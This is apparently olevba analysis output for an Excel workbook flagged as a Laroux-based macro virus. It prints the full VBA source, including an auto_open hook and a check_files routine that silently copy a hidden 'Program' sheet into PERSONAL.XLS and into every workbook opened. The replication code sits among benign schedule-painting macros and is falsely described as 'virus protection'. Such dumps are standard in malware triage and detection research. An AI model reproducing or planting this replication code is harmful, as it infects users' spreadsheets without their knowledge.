olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-ecd88ae50b732c3ffd3b8134f8d4f4eb194e821f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Sheet11.cls 
in file: Virus.MSExcel.Laroux-based-ecd88ae50b732c3ffd3b8134f8d4f4eb194e821f - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Program.bas 
in file: Virus.MSExcel.Laroux-based-ecd88ae50b732c3ffd3b8134f8d4f4eb194e821f - OLE stream: '_VBA_PROJECT_CUR/VBA/Program'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Laroux-based-ecd88ae50b732c3ffd3b8134f8d4f4eb194e821f - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Laroux-based-ecd88ae50b732c3ffd3b8134f8d4f4eb194e821f - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Program1.bas 
in file: Virus.MSExcel.Laroux-based-ecd88ae50b732c3ffd3b8134f8d4f4eb194e821f - OLE stream: '_VBA_PROJECT_CUR/VBA/Program1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


'
' This macro program for virus protection & Schedule control program
'       by Burinthorn  Thong-o.
'
'
'This part for declaration globle variable
'
Dim First_col, Last_col As Integer
    Const start_row = 22
    Const finish_row = 66
    Const start_col = 18
    Const finish_col = 50
'
'end section
'

Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "check_files"
End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "PERSONAL.XLS")
    If m$ = "PERSONAL.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    Select Case whichfile
    Case 10
        Application.ScreenUpdating = False
        n4$ = ActiveWorkbook.Name
        Sheets("Program").Visible = True
        Sheets("Program").Select
        Sheets("Program").Copy
        With ActiveWorkbook
            .Title = ""
            .Subject = ""
            .Author = ""
            .Keywords = ""
            .Comments = ""
        End With
        newname$ = ActiveWorkbook.Name
        c4$ = CurDir()
        ChDir Application.StartupPath
        ActiveWindow.Visible = False
        Workbooks(newname$).SaveAs Filename:=Application.StartupPath & "/" & "PERSONAL.XLS", _
                FileFormat:=xlNormal, password:="", writerespassword:="", _
                ReadOnlyRecommended:=False, CreateBackup:=False
        ChDir c4$
        Workbooks(n4$).Sheets("Program").Visible = False
        Application.OnSheetActivate = ""
        Application.ScreenUpdating = True
        Application.OnSheetActivate = "personal.xls!check_files"
    Case 1
        Application.ScreenUpdating = False
        n4$ = ActiveWorkbook.Name
        p4$ = ActiveWorkbook.Path
        s$ = Workbooks(n4$).Sheets(1).Name
        If s$ <> "Program" Then
            Workbooks("PERSONAL").Sheets("Program").Copy before:=Workbooks(n4$).Sheets(1)
            Workbooks(n4$).Sheets("Program").Visible = False
        Else
        End If
        Application.OnSheetActivate = ""
        Application.ScreenUpdating = True
        Application.OnSheetActivate = "personal.xls!check_files"
    Case Else
    End Select
End Sub

Sub Plan_Paint()
Attribute Plan_Paint.VB_ProcData.VB_Invoke_Func = " \n14"
    'txt = " Select time of planning work."   Use to open dialoque to
    'Set Rng = Get_rng(txt)                     input range which can
    'Rng.Select                                 use by Y_paint,C_paint too
    With Selection.Interior
        .ColorIndex = 7
        .Pattern = xlSolid
        .PatternColorIndex = xlAutomatic
    End With
    Selection.Font.ColorIndex = 2
    Selection.Borders(xlRight).LineStyle = xlNone
End Sub
    
Sub Actual_Paint()
Attribute Actual_Paint.VB_ProcData.VB_Invoke_Func = " \n14"
    With Selection.Interior
        .ColorIndex = 6
        .Pattern = xlSolid
    End With
    Selection.Font.ColorIndex = 1
    Selection.Borders(xlRight).LineStyle = xlNone
End Sub

Sub C_Paint()
Attribute C_Paint.VB_ProcData.VB_Invoke_Func = " \n14"
    Selection.Interior.ColorIndex = xlNone
    Selection.Font.ColorIndex = 0
    With Selection.Borders(xlRight)
        .Weight = xlThin
        .ColorIndex = xlAutomatic
    End With
End Sub

Function Get_rng(Pmt)
Attribute Get_rng.VB_ProcData.VB_Invoke_Func = " \n14"
    Set Get_rng = Application.InputBox(prompt:=Pmt, _
        Title:="Input Range Dialoque!", Type:=8)
End Function

Sub Underline()
Attribute Underline.VB_ProcData.VB_Invoke_Func = " \n14"
    ActiveCell.Offset(1, 3).Font.Underline = xlDouble
End Sub

Function actv_sheet(sht)
Attribute actv_sheet.VB_ProcData.VB_Invoke_Func = " \n14"
    If Not (Worksheets(sht).Activate) Then
        Worksheets(sht).Select
    End If
End Function

Function Begin_col(Rw) As Integer
Attribute Begin_col.VB_ProcData.VB_Invoke_Func = " \n14"
Dim Counter As Integer
    Counter = 1
    Do While (Cells(Rw, Counter).Interior.ColorIndex = xlNone)
        Counter = Counter + 1
        If Counter > 49 Then
            Exit Do
        End If
    Loop
    Begin_col = Counter
    If Begin_col < First_col Then
        First_col = Begin_col
    End If
End Function

Function End_col(Rw, Beg)
Attribute End_col.VB_ProcData.VB_Invoke_Func = " \n14"
Dim i As Integer
    For i = Beg To 50 Step 1
        If Cells(Rw, i).Interior.ColorIndex = xlNone Then
            Exit For
        End If
    End_col = i
    Next i
    If End_col > Last_col Then
        Last_col = End_col
    End If
End Function

Function Put_on(Rw, fag)
Attribute Put_on.VB_ProcData.VB_Invoke_Func = " \n14"
Dim Beg_time, End_time As Integer
    If Not (Cells(Rw, 5).Value = "") Then
        Beg_time = Begin_col(Rw)
        End_time = End_col(Rw, Beg_time)
        If (fag = "Y" And Beg_time < 50) Then
            Week = End_time - Beg_time + 1
            PerC = (Cells(Rw, 5).Value) / Week
            Range(Cells(Rw, Beg_time), Cells(Rw, _
                End_time)).Value = PerC
        End If
    End If
End Function

Sub Calc_Up()
Attribute Calc_Up.VB_ProcData.VB_Invoke_Func = " \n14"
Dim j As Integer
    First_col = 50
    Last_col = 0
    actv_sheet ("Blank")
    For j = 7 To 18 Step 2
        Put_on j, "Y"
    Next j
    Worksheets("Blank").Cells(3, 60).Value = First_col
    Worksheets("Blank").Cells(4, 60).Value = Last_col
    First_col = 50
    Last_col = 0
    For j = 22 To 66 Step 3
        Put_on j, "Y"
    Next j
    Worksheets("Blank").Cells(3, 61).Value = First_col
    Worksheets("Blank").Cells(4, 61).Value = Last_col
End Sub

Sub Calc_Down()
Attribute Calc_Down.VB_ProcData.VB_Invoke_Func = " \n14"
    actv_sheet ("Blank")                'For select sheet if not select
    First_col = Worksheets("Blank").Cells(3, 61).Value
    Last_col = Worksheets("Blank").Cells(4, 61).Value
    Range(Cells(67, First_col), Cells(68, First_col)). _
        Offset(0, -1).Value = 0         'Put zero first of column of sum percent
    For i = First_col To Last_col Step 1
        Sum = 0
        For j = 22 To 66 Step 3
            Sum = Sum + Cells(j, i).Value
        Next j
        Cells(67, i).Value = Sum
        Cells(68, i).Value = Sum + Cells(68, i).Offset(0, -1).Value
    Next i
End Sub

Sub main()
Attribute main.VB_ProcData.VB_Invoke_Func = " \n14"
    If Not (Toolbars("Sch_cont").Visible) Then
        Toolbars("Sch_cont").Visible = True
    End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Laroux-based-ecd88ae50b732c3ffd3b8134f8d4f4eb194e821f - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  XXXXXX
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  000000
' 0085     17 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  FLOWCHAR
' 0085     26 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  PROCESS MGMNT PLA
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

